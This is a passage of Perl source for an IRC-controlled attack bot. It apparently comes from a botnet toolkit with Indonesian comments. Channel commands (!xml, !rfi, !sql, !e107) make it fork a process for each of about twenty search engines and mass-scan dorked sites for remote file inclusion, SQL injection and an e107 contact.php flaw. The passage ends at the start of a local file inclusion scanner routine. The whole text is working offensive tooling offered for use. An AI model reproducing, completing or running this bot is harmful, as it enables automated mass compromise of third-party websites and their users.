if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12szukacz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12kvasir";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12ixquic";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12libero";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12tiscali";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12gigablast";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12sapo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12naver";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12rediff";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12walla";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!xml\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "xml15> 1215<4@12aol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerxml($engx,$bugx,$d0rk);
        }
        exit;
    }
}
##############################################################
##                      Exploitasi rfi                      ##
##############################################################
if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "google";
            my $bugx = $1;
            my $d0rk = $2;
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12scaner-rfi15> 12Loading rfi scanner... ");
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12gfind";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12alltheweb";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12altavista";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12yahoo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12msn";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12virgillio";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12ask";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12uol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12lycos";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12snz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12seznam";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12szukacz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12kvasir";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12ixquic";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12libero";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12tiscali";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12gigablast";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12sapo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12naver";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12rediff";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12walla";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!rfi\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "rfi15> 1215<4@12aol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanerrfi($engx,$bugx,$d0rk);
        }
        exit;
    }
}
##############################################################
##                      Exploitasi sql                      ##
##############################################################
if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "google";
            my $bugx = $1;
            my $d0rk = $2;
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12scaner-sql15> 12Loading sql scanner... ");
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12gfind";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12alltheweb";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12altavista";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12yahoo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12msn";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12virgillio";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12ask";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12uol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12lycos";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12snz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12seznam";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12szukacz";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12kvasir";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12ixquic";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12libero";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12tiscali";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12gigablast";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12sapo";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12naver";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12rediff";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12walla";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!sql\s+(.*?)\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "sql15> 1215<4@12aol";
            my $bugx = $1;
            my $d0rk = $2;
            &scanersql($engx,$bugx,$d0rk);
        }
        exit;
    }
}
##############################################################
##                      Exploitasi e107                     ##
##############################################################
if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e107> 1215<4@12google";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            sendraw($IRC_cur_socket, "PRIVMSG $channel : 15<4@12scaner-e10715> 12 Loading e107 scanner... ");
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12gfind";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12alltheweb";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12virgillio";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
     }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12altavista";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12ask";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12uol";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12yahoo";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12msn";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12lycos";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12snz";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12seznam";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12szukacz";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e107 15> 1215<4@12kvasir";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12ixquic";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12libero";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12tiscali";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12gigablast";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12sapo";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12naver";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12rediff";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12walla";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}

if ($msg=~ /PRIVMSG $channel :!e107\s+(.*)/ ) {
    if (my $pid = fork) {
        waitpid($pid, 0);
    }
    else {
        if (fork) {    exit; } else {
            my $engx = "e10715> 1215<4@12aol";
            my $bugx = "/contact.php";
            my $d0rk = $1;
            &scanere107($engx,$bugx,$d0rk);
        }
        exit;
    }
}
#####################################################################
        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line=$line_temp.$line if ($line_temp);
            $line_temp='';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}
#####################################################################
#######################      Procedure LFI      #####################
#####################################################################
sub scanerlfi() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @google=&google($dork);
        push(@total, @google);
        }
    if ($engz =~ /gfind/) {
        my @gfind=&google2($dork);
        push(@total, @gfind);
        }
    if ($engz =~ /alltheweb/) {
        my @alltheweb=&alltheweb($dork);
        push(@total, @alltheweb);
        }
    if ($engz =~ /altavista/) {
        my @altavista=&altavista($dork);
        push(@total, @altavista);
        }
    if ($engz =~ /yahoo/) {
        my @yahoo=&yahoo($dork);
        push(@total, @yahoo);
        }
    if ($engz =~ /msn/) {
        my @msn=&msn($dork);
        push(@total, @msn);
        }
    if ($engz =~ /virgillio/) {
        my @virgillio=&virgillio($dork);
        push(@total, @virgillio);
        }
    if ($engz =~ /ask/) {
        my @ask=&ask($dork);
        push(@total, @ask);
        }
    if ($engz =~ /uol/) {
        my @uol=&uol($dork);
        push(@total, @uol);
        }
    if ($engz =~ /lycos/) {
        my @lycos=&lycos($dork);
        push(@total, @lycos);
    }
    if ($engz =~ /snz/) {
        my @snz=&snz($dork);
        push(@total, @snz);
    }
    if ($engz =~ /seznam/) {
        my @seznam=&seznam($dork);
        push(@total, @seznam);
    }
